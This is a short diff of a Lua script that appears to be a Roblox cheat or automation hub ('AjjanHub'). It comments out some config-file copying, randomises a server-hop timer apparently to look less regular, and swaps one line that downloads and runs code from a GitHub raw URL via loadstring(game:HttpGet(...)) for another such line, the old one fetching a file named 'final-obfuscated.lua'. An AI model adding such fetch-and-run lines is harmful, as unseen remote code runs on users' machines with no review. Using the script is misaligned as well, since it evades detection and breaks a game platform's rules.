@@ -484,11 +484,11 @@ repeat
 until saveData and saveData.SpeedPower ~= nil
 
 if speedPower < 2000000 then
-    local theConfig = readfile("AjjanHub/settings/Config/0.json")
-    writefile("AjjanHub/settings/Config/3.json",theConfig)
+    -- local theConfig = readfile("AjjanHub/settings/Config/0.json")
+    -- writefile("AjjanHub/settings/Config/3.json",theConfig)
 else
-    local theConfig = readfile("AjjanHub/settings/Config/1.json")
-    writefile("AjjanHub/settings/Config/3.json",theConfig)
+    -- local theConfig = readfile("AjjanHub/settings/Config/1.json")
+    -- writefile("AjjanHub/settings/Config/3.json",theConfig)
 end
 
 
@@ -607,7 +607,7 @@ task.spawn(function()
     local jobId = game.JobId -- ID Server saat ini
 
     -- Waktu tunggu dalam detik (30 menit = 1800 detik)
-    local WAKTU_TUNGGU = 1800
+    local WAKTU_TUNGGU = math.random(1700, 1900)
 
     task.wait(WAKTU_TUNGGU)
 
@@ -619,4 +619,5 @@ task.spawn(function()
     
 end)
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/virtuososvisualedits-prog/Ww/refs/heads/main/final-obfuscated.lua"))()
+-- loadstring(game:HttpGet("https://raw.githubusercontent.com/virtuososvisualedits-prog/Ww/refs/heads/main/final-obfuscated.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()
